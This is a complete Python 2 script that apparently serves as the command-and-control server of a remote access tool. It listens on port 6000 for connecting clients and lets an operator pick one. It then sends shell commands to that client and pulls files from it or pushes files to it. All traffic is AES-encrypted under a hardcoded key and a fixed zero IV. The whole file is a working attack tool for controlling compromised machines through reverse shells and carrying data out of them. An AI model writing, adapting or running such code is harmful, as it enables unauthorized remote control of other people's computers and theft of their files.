#!/usr/bin/env python

from Crypto.Cipher import AES
import socket, base64, os, time, sys, select

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# clear function
##################################
# Windows ---------------> cls
# Linux   ---------------> clear
if os.name == 'posix': clf = 'clear'
if os.name == 'nt': clf = 'cls'
clear = lambda: os.system(clf)

# initialize socket
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.bind(('0.0.0.0', 6000))
c.listen(128)

# client information
active = False
clients = []
socks = []
interval = 0.8

# Functions
###########

# send data
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))

# receive data
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data += decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]

# download file
def download(sock, remote_filename, local_filename=None):
	# check if file exists
	if not local_filename:
		local_filename = remote_filename
	try:
		f = open(local_filename, 'wb')
	except IOError:
		print "Error opening file.\n"
		Send(sock, "cd .")
		return
	# start transfer
	Send(sock, "download "+remote_filename)
	print "Downloading: " + remote_filename + " > " + local_filename
	fileData = Receive(sock)
	f.write(fileData)
	time.sleep(interval)
	f.close()
	time.sleep(interval)

# upload file
def upload(sock, local_filename, remote_filename=None):
	# check if file exists
	if not remote_filename:
		remote_filename = local_filename
	try:
		g = open(local_filename, 'rb')
	except IOError:
		print "Error opening file.\n"
		Send(sock, "cd .")
		return
	# start transfer
	Send(sock, "upload "+remote_filename)
	print 'Uploading: ' + local_filename + " > " + remote_filename
	while True:
		fileData = g.read()
		if not fileData: break
		Send(sock, fileData, "")
	g.close()
	time.sleep(interval)
	Send(sock, "")
	time.sleep(interval)
	
# refresh clients
def refresh():
	clear()
	print '\nListening for clients...\n'
	if len(clients) > 0:
		for j in range(0,len(clients)):
			print '[' + str((j+1)) + '] Client: ' + clients[j] + '\n'
	else:
		print "...\n"
	# print exit option
	print "---\n"
	print "[0] Exit \n"
	print "\nPress Ctrl+C to interact with client."


# main loop
while True:
	refresh()
	# listen for clients
	try:
		# set timeout
		c.settimeout(10)
		
		# accept connection
		try:
			s,a = c.accept()
		except socket.timeout:
			continue
		
		# add socket
		if (s):
			s.settimeout(None)
			socks += [s]
			clients += [str(a)]
		
		# display clients
		refresh()
		
		# sleep
		time.sleep(interval)

	except KeyboardInterrupt:
		
		# display clients
		refresh()
		
		# accept selection --- int, 0/1-128
		activate = input("\nEnter option: ")
		
		# exit
		if activate == 0:
			print '\nExiting...\n'
			for j in range(0,len(socks)):
				socks[j].close()
			sys.exit()
		
		# subtract 1 (array starts at 0)
		activate -= 1
	
		# clear screen
		clear()
		
		# create a cipher object using the random secret
		cipher = AES.new(secret,AES.MODE_CFB,'0000000000000000')
		print '\nActivating client: ' + clients[activate] + '\n'
		active = True
		Send(socks[activate], 'Activate')
		
	# interact with client
	while active:
		try:
			# receive data from client
			data = Receive(socks[activate])
		# disconnect client.
		except:
			print '\nClient disconnected... ' + clients[activate]
			# delete client
			socks[activate].close()
			time.sleep(0.8)
			socks.remove(socks[activate])
			clients.remove(clients[activate])
			refresh()
			active = False
			break

		# exit client session
		if data == 'quitted':
			# print message
			print "Exit.\n"
			# remove from arrays
			socks[activate].close()
			socks.remove(socks[activate])
			clients.remove(clients[activate])
			# sleep and refresh
			time.sleep(0.8)
			refresh()
			active = False
			break
		# if data exists
		elif data != '':
			# get next command
			sys.stdout.write(data)
			nextcmd = raw_input()
		
		# download
		if nextcmd.startswith("download ") == True:
			if len(nextcmd.split(' ')) > 2:
				download(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
			else:
				download(socks[activate], nextcmd.split(' ')[1])
		
		# upload
		elif nextcmd.startswith("upload ") == True:
			if len(nextcmd.split(' ')) > 2:
				upload(socks[activate], nextcmd.split(' ')[1], nextcmd.split(' ')[2])
			else:
				upload(socks[activate], nextcmd.split(' ')[1])
		
		# normal command
		elif nextcmd != '':
			Send(socks[activate], nextcmd)

		elif nextcmd == '':
			print 'Think before you type. ;)\n'
